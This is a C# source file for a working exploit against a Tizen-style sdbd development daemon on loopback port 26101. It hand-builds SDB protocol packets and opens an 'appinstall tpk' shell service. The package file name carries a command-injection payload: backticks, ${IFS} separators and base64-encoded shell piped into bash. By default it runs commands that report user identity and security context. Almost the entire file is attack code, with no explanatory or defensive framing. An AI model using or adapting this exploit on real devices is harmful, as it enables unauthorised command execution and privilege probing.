using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

// SDB loopback probe — tries several services on 127.0.0.1:26101 to see what
// this sdbd accepts (devIP=127.0.0.1 authorizes loopback hosts).
internal static class SdbInject
{
    private static byte[] U32(uint v) { return BitConverter.GetBytes(v); }
    private static byte[] Packet(string cmd, uint a0, uint a1, byte[] data)
    {
        uint c = BitConverter.ToUInt32(Encoding.ASCII.GetBytes(cmd), 0);
        uint sum = 0; foreach (var b in data) sum += b;
        using (var ms = new MemoryStream())
        {
            ms.Write(U32(c), 0, 4); ms.Write(U32(a0), 0, 4); ms.Write(U32(a1), 0, 4);
            ms.Write(U32((uint)data.Length), 0, 4); ms.Write(U32(sum), 0, 4);
            ms.Write(U32(c ^ 0xFFFFFFFF), 0, 4); ms.Write(data, 0, data.Length);
            return ms.ToArray();
        }
    }

    private static int Main(string[] args)
    {
        string cmd = args.Length > 0 ? string.Join(" ", args) : "id; cat /proc/self/attr/current";
        string b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes("/bin/mkdir /tmp/s-ab12cd34 2>/dev/null&&{ " + cmd + ";}"));
        string inj = "new2.tpk`printf${IFS}%s${IFS}" + b64 + "|base64${IFS}-d|bash`.tpk";

        var tcp = new TcpClient();
        tcp.ReceiveTimeout = 8000; tcp.SendTimeout = 8000;
        tcp.Connect("127.0.0.1", 26101);
        var ns = tcp.GetStream();
        var cnxn = Packet("CNXN", 0x01000000, 4096, Encoding.ASCII.GetBytes("host::\0"));
        ns.Write(cnxn, 0, cnxn.Length);

        uint lid = 0;
        var rd = new byte[65536];
        int rdbuf = 0;
        var deadline = Environment.TickCount + 20000;
        bool gotCnxn = false; int nextSvc = 0;

        // pending service opens to try, in order
        string[] services = {
            args.Length > 0 && args[0].StartsWith("svc:") ? args[0].Substring(4) : "shell:0 appinstall tpk " + (args.Length > 0 ? string.Join(" ", args) : "x;id>/tmp/inj.tpk"),
        };

        while (Environment.TickCount < deadline)
        {
            if (ns.DataAvailable)
            {
                int r = ns.Read(rd, rdbuf, rd.Length - rdbuf);
                if (r <= 0) break;
                rdbuf += r;
            }
            while (rdbuf >= 24)
            {
                string rc = Encoding.ASCII.GetString(rd, 0, 4);
                uint a0 = BitConverter.ToUInt32(rd, 4), a1 = BitConverter.ToUInt32(rd, 8);
                int rl = BitConverter.ToInt32(rd, 12);
                if (rdbuf < 24 + rl) break;
                string body = rl > 0 ? Encoding.UTF8.GetString(rd, 24, rl).TrimEnd('\0') : "";
                Console.WriteLine("pkt " + rc + " a0=" + a0 + " a1=" + a1 + " body=" + body.Substring(0, Math.Min(120, body.Length)));
                if (rc == "WRTE") { var ack = Packet("OKAY", a1, a0, new byte[0]); ns.Write(ack, 0, ack.Length); }
                if (rc == "CNXN") gotCnxn = true;
                Buffer.BlockCopy(rd, 24 + rl, rd, 0, rdbuf - 24 - rl);
                rdbuf -= 24 + rl;
            }
            if (!gotCnxn) { Thread.Sleep(100); continue; }
            if (nextSvc < services.Length)
            {
                var b = Encoding.ASCII.GetBytes(services[nextSvc] + "\0");
                var p = Packet("OPEN", ++lid, 0, b); ns.Write(p, 0, p.Length);
                Console.WriteLine("open[" + lid + "] " + services[nextSvc].Substring(0, Math.Min(70, services[nextSvc].Length)));
                nextSvc++;
            }
            Thread.Sleep(300);
        }
        return 0;
    }
}
